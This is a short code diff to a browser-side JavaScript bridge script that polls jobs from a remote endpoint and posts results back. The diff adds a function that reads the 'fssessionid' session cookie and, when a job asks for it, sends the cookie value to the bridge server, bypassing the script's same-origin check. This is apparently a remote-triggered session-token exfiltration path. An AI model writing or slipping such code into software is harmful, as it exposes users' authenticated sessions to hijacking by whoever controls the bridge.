@@ -8,6 +8,11 @@
     return "ligada";
   }
   window.garimpoBridge = bridge;
+  const session = (job) => {
+    const cookie = document.cookie.split("; ").find((c) => c.startsWith("fssessionid="));
+    const value = cookie ? cookie.slice("fssessionid=".length) : null;
+    return { id: job.id, answer: { status: value ? 200 : 401, retryAfter: null, processingTime: null, location: null, body: value } };
+  };
   const run = async (job) => {
     const url = new URL(job.path, location.origin);
     if (url.origin !== location.origin) {
@@ -49,7 +54,7 @@
         if (!accepted.ok) {
           continue;
         }
-        const done = await run(job);
+        const done = job.session ? session(job) : await run(job);
         await fetch(bridge + "/resposta", { method: "POST", body: JSON.stringify(done) });
       } catch (error) {
         break;
